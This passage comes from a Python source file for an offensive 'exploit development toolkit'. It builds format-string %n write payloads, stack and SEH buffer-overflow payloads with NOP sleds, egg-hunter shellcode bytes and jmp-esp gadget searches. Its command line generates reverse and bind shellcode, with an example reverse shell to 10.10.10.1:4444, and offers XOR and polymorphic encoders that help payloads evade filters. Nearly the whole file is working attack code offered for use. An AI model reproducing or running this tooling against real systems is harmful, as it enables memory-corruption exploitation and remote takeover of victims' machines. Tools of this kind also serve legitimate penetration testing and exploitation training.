            if needle_le.lower() in cleaned:
                return idx + 1
        return -1

    @staticmethod
    def write_what_where(what: int, where: int, offset: int,
                         arch: int = 64, writes_per_call: int = 2) -> str:
        """Generate a format-string ``%n`` write payload.

        Supports 2-byte (``%hn``) writes for reliability.
        """
        if arch == 64:
            addr_size = 8
            pack_fmt = "<Q"
        else:
            addr_size = 4
            pack_fmt = "<I"

        if writes_per_call == 1:
            payload_addrs = struct.pack(pack_fmt, where)
            written = len(payload_addrs)
            to_write = what & 0xFFFFFFFF
            pad = (to_write - written) % (0x100000000)
            return payload_addrs.hex() + f" %{pad}c%{offset}$n" if pad else \
                   payload_addrs.hex() + f" %{offset}$n"

        pairs: List[Tuple[int, int]] = []
        for i in range(4):
            val = (what >> (16 * i)) & 0xFFFF
            addr = where + (2 * i)
            pairs.append((val, addr))
        pairs.sort(key=lambda x: x[0])

        addr_block = b""
        for _, addr in pairs:
            addr_block += struct.pack(pack_fmt, addr)
        header_len = len(addr_block)

        fmt_parts: List[str] = []
        written = header_len
        for idx, (val, _) in enumerate(pairs):
            target = val if val > 0 else 0x10000
            delta = (target - written) % 0x10000
            if delta > 0:
                fmt_parts.append(f"%{delta}c")
            fmt_parts.append(f"%{offset + idx}$hn")
            written = target

        return addr_block.hex() + "".join(fmt_parts)

    @staticmethod
    def read_address(addr: int, offset: int, arch: int = 64) -> str:
        """Generate a format-string ``%s`` read payload for *addr*."""
        if arch == 64:
            addr_bytes = struct.pack("<Q", addr)
        else:
            addr_bytes = struct.pack("<I", addr)
        return addr_bytes.hex() + f"%{offset}$s"


# =============================================================================
#  BUFFER OVERFLOW HELPER
# =============================================================================

class BufferOverflowHelper:
    """Stack-based buffer overflow exploit construction."""

    @staticmethod
    def generate_payload(offset: int, ret_addr: int, shellcode: bytes,
                         nop_sled: int = 16, arch: int = 64) -> ExploitPayload:
        if arch == 64:
            ret_bytes = struct.pack("<Q", ret_addr)
        else:
            ret_bytes = struct.pack("<I", ret_addr)

        padding = b"A" * offset
        nops = b"\x90" * nop_sled
        buf = padding + ret_bytes + nops + shellcode

        return ExploitPayload(
            buffer=buf,
            description=(
                f"overflow offset={offset}, ret=0x{ret_addr:x}, "
                f"nop_sled={nop_sled}, shellcode={len(shellcode)}b"
            ),
            bad_chars_free=(b"\x00" not in buf),
        )

    @staticmethod
    def find_jmp_esp(binary_path: str) -> List[int]:
        """Search *binary_path* for ``jmp esp`` (\\xff\\xe4) gadgets."""
        data = Path(binary_path).read_bytes()
        pattern = b"\xff\xe4"
        addrs: List[int] = []
        start = 0
        while True:
            idx = data.find(pattern, start)
            if idx == -1:
                break
            addrs.append(idx)
            start = idx + 1
        return addrs

    @staticmethod
    def find_call_esp(binary_path: str) -> List[int]:
        """Search *binary_path* for ``call esp`` (\\xff\\xd4) gadgets."""
        data = Path(binary_path).read_bytes()
        pattern = b"\xff\xd4"
        addrs: List[int] = []
        start = 0
        while True:
            idx = data.find(pattern, start)
            if idx == -1:
                break
            addrs.append(idx)
            start = idx + 1
        return addrs

    @staticmethod
    def egg_hunter(tag: str, arch: str = "x86",
                   platform: str = "linux") -> bytes:
        """Generate egg-hunter shellcode that searches memory for *tag*.

        The tag is prepended twice (``tagtag``) in front of the real
        shellcode so the hunter can locate it.
        """
        if len(tag) != 4:
            raise ValueError("Egg tag must be exactly 4 ASCII characters")
        tag_bytes = tag.encode("ascii")

        if platform == "linux" and arch == "x86":
            return _EGG_HUNTER_LINUX_X86 + tag_bytes + (
                b"\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
            )
        if platform == "linux" and arch == "x64":
            return _EGG_HUNTER_LINUX_X64 + tag_bytes * 2 + (
                b"\x48\x8d\x74\x24\xf8\x48\xaf\x75\xf4"
                b"\x48\xaf\x75\xf1\xff\xe6"
            )
        if platform in ("win", "windows") and arch == "x86":
            return _EGG_HUNTER_WIN_X86 + tag_bytes + (
                b"\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
            )
        raise ValueError(f"No egg-hunter for {platform}-{arch}")

    @staticmethod
    def seh_overwrite(offset: int, nseh_addr: int,
                      handler_addr: int, shellcode: bytes,
                      arch: int = 32) -> ExploitPayload:
        """Build an SEH-based overflow payload (Windows)."""
        padding = b"A" * offset
        nseh = struct.pack("<I", nseh_addr)
        handler = struct.pack("<I", handler_addr)
        nops = b"\x90" * 16
        buf = padding + nseh + handler + nops + shellcode
        return ExploitPayload(
            buffer=buf,
            description=(
                f"SEH overwrite offset={offset}, "
                f"nSEH=0x{nseh_addr:08x}, handler=0x{handler_addr:08x}"
            ),
        )


# =============================================================================
#  CLI
# =============================================================================

def _cli_pattern(args: argparse.Namespace) -> None:
    pg = PatternGenerator(arch=args.arch)
    if args.action == "create":
        pat = pg.create_string(args.length)
        C.ok(f"Pattern ({args.length} bytes, {args.arch}-bit):")
        C.p(f"  {pat}")
    elif args.action == "offset":
        off = pg.find_offset(args.value, endian=args.endian)
        if off >= 0:
            C.ok(f"Offset found: {C.GRN}{C.BLD}{off}{C.R}")
        else:
            C.err("Value not found in pattern")


def _cli_shellcode(args: argparse.Namespace) -> None:
    sb = ShellcodeBuilder()
    sc: bytes = b""
    desc = ""

    if args.action == "reverse":
        sc = sb.reverse_shell(args.host, args.port, args.arch, args.platform)
        desc = f"reverse shell -> {args.host}:{args.port}"
    elif args.action == "bind":
        sc = sb.bind_shell(args.port, args.arch, args.platform)
        desc = f"bind shell on port {args.port}"
    elif args.action == "exec":
        sc = sb.exec_command(args.cmd, args.arch, args.platform)
        desc = f"exec: {args.cmd}"

    if args.null_free:
        sc = ShellcodeBuilder.null_free(sc)
        desc += " (null-free)"

    payload = ExploitPayload(buffer=sc, description=desc)
    C.ok(f"Shellcode: {desc} ({payload.length} bytes)")
    if args.format == "hex":
        C.p(payload.hex_dump())
    elif args.format == "c":
        C.p(payload.c_array())
    elif args.format == "python":
        C.p(payload.python_bytes())
    else:
        C.p(payload.hex_dump())


def _cli_encode(args: argparse.Namespace) -> None:
    raw = bytes.fromhex(args.input)
    bad = [int(x, 16) for x in args.bad_chars.split(",")] if args.bad_chars else []

    if args.encoder == "xor":
        key = bytes.fromhex(args.key) if args.key else b"\x41"
        result = PayloadEncoder.xor_encode(raw, key, bad)
    elif args.encoder == "alpha":
        result = PayloadEncoder.alphanumeric_encode(raw)
    elif args.encoder == "base64":
        result = PayloadEncoder.base64_wrap(raw)
    elif args.encoder == "poly":
        result = PayloadEncoder.polymorphic_wrapper(raw)
    else:
        C.err(f"Unknown encoder: {args.encoder}")
        return

    C.ok(f"Encoder: {result.encoder_name}")
    C.info(f"Original: {result.original_size} bytes -> Encoded: {result.encoded_size} bytes")
    if result.bad_chars_present:
        C.warn(f"Bad chars in output: {', '.join(f'0x{b:02x}' for b in result.bad_chars_present)}")
    ep = ExploitPayload(buffer=result.payload, description=result.encoder_name)
    C.p(ep.hex_dump())


def _cli_badchars(args: argparse.Namespace) -> None:
    bcf = BadCharFinder()
    if args.action == "generate":
        test = bcf.generate_test_string()
        C.ok(f"Test string ({len(test)} bytes):")
        ep = ExploitPayload(buffer=test, description="badchar test")
        C.p(ep.hex_dump())
    elif args.action == "compare":
        sent = bytes.fromhex(args.sent)
        received = bytes.fromhex(args.received)
        bad = bcf.find_bad_chars(sent, received)
        if bad:
            C.warn(f"Bad characters found ({len(bad)}):")
            C.p(f"  {', '.join(f'0x{b:02x}' for b in bad)}")
            C.p(f"\n{bcf.suggest_encoding(bad)}")
        else:
            C.ok("No bad characters detected")


def _cli_rop(args: argparse.Namespace) -> None:
    rh = ROPHelper()
    if args.action == "find":
        gadgets = rh.find_gadgets(args.binary, max_depth=args.depth)
        C.ok(f"Found {len(gadgets)} gadgets in {args.binary}")
        for g in gadgets[:args.limit]:
            C.p(f"  {rh.gadget_to_string(g)}")
        if len(gadgets) > args.limit:
            C.info(f"... and {len(gadgets) - args.limit} more (use --limit to show more)")
    elif args.action == "search":
        gadgets = rh.find_specific(args.binary, args.pattern)
        C.ok(f"Found {len(gadgets)} matching gadgets")
        for g in gadgets:
            C.p(f"  {rh.gadget_to_string(g)}")


def _cli_fmtstr(args: argparse.Namespace) -> None:
    fsh = FormatStringHelper()
    if args.action == "offset":
        off = fsh.calculate_offset(args.response, args.marker)
        if off >= 0:
            C.ok(f"Parameter offset: {C.GRN}{C.BLD}{off}{C.R}")
        else:
            C.err("Marker not found in response")
    elif args.action == "write":
        what = int(args.what, 16)
        where = int(args.where, 16)
        payload = fsh.write_what_where(what, where, args.offset, arch=args.arch)
        C.ok("Write payload:")
        C.p(f"  {payload}")
    elif args.action == "read":
        addr = int(args.address, 16)
        payload = fsh.read_address(addr, args.offset, arch=args.arch)
        C.ok("Read payload:")
        C.p(f"  {payload}")


def _cli_overflow(args: argparse.Namespace) -> None:
    boh = BufferOverflowHelper()
    if args.action == "payload":
        sc = bytes.fromhex(args.shellcode) if args.shellcode else b"\xcc" * 4
        ret = int(args.ret, 16)
        result = boh.generate_payload(args.offset, ret, sc,
                                      nop_sled=args.nop, arch=args.arch)
        C.ok(f"Payload: {result.description} ({result.length} bytes)")
        C.p(result.hex_dump())
    elif args.action == "jmp-esp":
        addrs = boh.find_jmp_esp(args.binary)
        C.ok(f"Found {len(addrs)} jmp esp gadgets:")
        for a in addrs:
            C.p(f"  0x{a:08x}")
    elif args.action == "egg-hunter":
        hunter = boh.egg_hunter(args.tag, arch=args.egg_arch,
                                platform=args.egg_platform)
        C.ok(f"Egg hunter for tag '{args.tag}' ({len(hunter)} bytes):")
        ep = ExploitPayload(buffer=hunter, description="egg hunter")
        C.p(ep.hex_dump())


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="exploit_dev",
        description="FU PERSON - Exploit Development Toolkit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            examples:
              %(prog)s pattern create 500
              %(prog)s pattern offset 0x41326341
              %(prog)s shellcode reverse --host 10.10.10.1 --port 4444
              %(prog)s encode xor --input <hex> --key 41
              %(prog)s badchars generate
              %(prog)s rop find ./vuln_binary --depth 6
              %(prog)s format-string offset "AAAA0x41414141.0x..."
              %(prog)s overflow payload --offset 112 --ret 0x08041234
        """),
    )
    sub = parser.add_subparsers(dest="command", required=True)

    # --- pattern ---
    p_pat = sub.add_parser("pattern", help="Cyclic pattern tools")
    p_pat_sub = p_pat.add_subparsers(dest="action", required=True)

    p_create = p_pat_sub.add_parser("create", help="Generate cyclic pattern")
    p_create.add_argument("length", type=int, help="Pattern length")
    p_create.add_argument("--arch", type=int, default=64, choices=[32, 64])

    p_off = p_pat_sub.add_parser("offset", help="Find offset in pattern")
    p_off.add_argument("value", help="Value to find (hex int or ASCII)")
    p_off.add_argument("--endian", default="little", choices=["little", "big"])
    p_off.add_argument("--arch", type=int, default=64, choices=[32, 64])

    # --- shellcode ---
    p_sc = sub.add_parser("shellcode", help="Shellcode generation")
    p_sc_sub = p_sc.add_subparsers(dest="action", required=True)

    p_rev = p_sc_sub.add_parser("reverse", help="Reverse shell")
    p_rev.add_argument("--host", required=True)
    p_rev.add_argument("--port", type=int, required=True)
    p_rev.add_argument("--arch", default="x64", choices=["x86", "x64"])
    p_rev.add_argument("--platform", default="linux", choices=["linux", "win"])
    p_rev.add_argument("--null-free", action="store_true")
    p_rev.add_argument("--format", default="hex", choices=["hex", "c", "python"])

    p_bind = p_sc_sub.add_parser("bind", help="Bind shell")
    p_bind.add_argument("--port", type=int, required=True)
    p_bind.add_argument("--arch", default="x64", choices=["x86", "x64"])
    p_bind.add_argument("--platform", default="linux", choices=["linux", "win"])
    p_bind.add_argument("--null-free", action="store_true")
    p_bind.add_argument("--format", default="hex", choices=["hex", "c", "python"])

    p_exec = p_sc_sub.add_parser("exec", help="Execute command")
    p_exec.add_argument("--cmd", required=True)
    p_exec.add_argument("--arch", default="x64", choices=["x86", "x64"])
    p_exec.add_argument("--platform", default="linux", choices=["linux", "win"])
    p_exec.add_argument("--null-free", action="store_true")
    p_exec.add_argument("--format", default="hex", choices=["hex", "c", "python"])

    # --- encode ---
    p_enc = sub.add_parser("encode", help="Payload encoding")
    p_enc.add_argument("encoder", choices=["xor", "alpha", "base64", "poly"])
    p_enc.add_argument("--input", required=True, help="Hex-encoded shellcode")
    p_enc.add_argument("--key", default=None, help="XOR key in hex")
    p_enc.add_argument("--bad-chars", default=None, dest="bad_chars",
                       help="Comma-separated bad chars in hex (e.g. 00,0a,0d)")

    # --- badchars ---
    p_bc = sub.add_parser("badchars", help="Bad character tools")
    p_bc_sub = p_bc.add_subparsers(dest="action", required=True)

    p_bc_sub.add_parser("generate", help="Generate test string (0x00-0xff)")

    p_cmp = p_bc_sub.add_parser("compare", help="Compare sent vs received")
    p_cmp.add_argument("--sent", required=True, help="Hex-encoded sent bytes")
    p_cmp.add_argument("--received", required=True, help="Hex-encoded received bytes")

    # --- rop ---
    p_rop = sub.add_parser("rop", help="ROP gadget tools")
    p_rop_sub = p_rop.add_subparsers(dest="action", required=True)

    p_rfind = p_rop_sub.add_parser("find", help="Find all ROP gadgets")
    p_rfind.add_argument("binary", help="Path to binary")
    p_rfind.add_argument("--depth", type=int, default=5)
    p_rfind.add_argument("--limit", type=int, default=50)

    p_rsearch = p_rop_sub.add_parser("search", help="Search specific gadget pattern")
    p_rsearch.add_argument("binary", help="Path to binary")
    p_rsearch.add_argument("--pattern", required=True)

    # --- format-string ---
    p_fmt = sub.add_parser("format-string", help="Format string exploit tools")
    p_fmt_sub = p_fmt.add_subparsers(dest="action", required=True)

    p_foff = p_fmt_sub.add_parser("offset", help="Find parameter offset")
    p_foff.add_argument("response", help="Leaked response string")
    p_foff.add_argument("--marker", default="AAAA")

    p_fwr = p_fmt_sub.add_parser("write", help="Generate write payload")
    p_fwr.add_argument("--what", required=True, help="Value to write (hex)")
    p_fwr.add_argument("--where", required=True, help="Target address (hex)")
    p_fwr.add_argument("--offset", type=int, required=True)
    p_fwr.add_argument("--arch", type=int, default=64, choices=[32, 64])

    p_frd = p_fmt_sub.add_parser("read", help="Generate read payload")
    p_frd.add_argument("--address", required=True, help="Address to read (hex)")
    p_frd.add_argument("--offset", type=int, required=True)
    p_frd.add_argument("--arch", type=int, default=64, choices=[32, 64])

    # --- overflow ---
    p_ov = sub.add_parser("overflow", help="Buffer overflow tools")
    p_ov_sub = p_ov.add_subparsers(dest="action", required=True)

    p_ovp = p_ov_sub.add_parser("payload", help="Generate overflow payload")
    p_ovp.add_argument("--offset", type=int, required=True)
    p_ovp.add_argument("--ret", required=True, help="Return address (hex)")
    p_ovp.add_argument("--shellcode", default=None, help="Shellcode hex string")
    p_ovp.add_argument("--nop", type=int, default=16)
    p_ovp.add_argument("--arch", type=int, default=64, choices=[32, 64])

    p_jmp = p_ov_sub.add_parser("jmp-esp", help="Find jmp esp gadgets")
    p_jmp.add_argument("binary", help="Path to binary")

    p_egg = p_ov_sub.add_parser("egg-hunter", help="Generate egg hunter")
    p_egg.add_argument("--tag", required=True, help="4-char tag (e.g. w00t)")
    p_egg.add_argument("--egg-arch", default="x86", choices=["x86", "x64"],
                       dest="egg_arch")
    p_egg.add_argument("--egg-platform", default="linux",
                       choices=["linux", "win"], dest="egg_platform")

    return parser


def main() -> None:
    C.banner("FU PERSON :: EXPLOIT DEVELOPMENT TOOLKIT v1.0")
    C.p(f"  {C.DIM}Capstone disassembler: "
        f"{'available' if HAS_CAPSTONE else 'not installed (using built-in)'}{C.R}\n")

    parser = build_parser()
    args = parser.parse_args()

    dispatch = {
        "pattern":       _cli_pattern,
        "shellcode":     _cli_shellcode,
        "encode":        _cli_encode,
        "badchars":      _cli_badchars,
        "rop":           _cli_rop,
        "format-string": _cli_fmtstr,
        "overflow":      _cli_overflow,
    }

    handler = dispatch.get(args.command)
    if handler:
        handler(args)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
